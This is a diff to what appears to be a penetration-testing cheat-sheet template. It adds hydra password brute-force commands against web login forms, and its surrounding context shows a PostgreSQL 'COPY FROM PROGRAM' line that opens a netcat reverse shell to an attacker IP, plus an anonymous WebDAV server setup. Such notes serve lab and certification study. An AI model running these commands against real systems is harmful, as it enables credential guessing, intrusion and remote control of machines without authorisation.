@@ -44,6 +44,12 @@ platform:platform
 
 # HTTP/HTTPS(80,8080,8000,443...)
 
+## hydra
+```bash
+hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+```
+
 ## wappalyzer
 
 ## gobuster
@@ -322,7 +328,8 @@ ex) COPY cmd_exec FROM PROGRAM 'nc 192.168.45.176 4444 -e /bin/bash'
 *DROP TABLE IF EXISTS cmd_exec;*
 ```
 
-##
+
+## Library
 ```bash
 # First run wsgi
 /usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/webdav
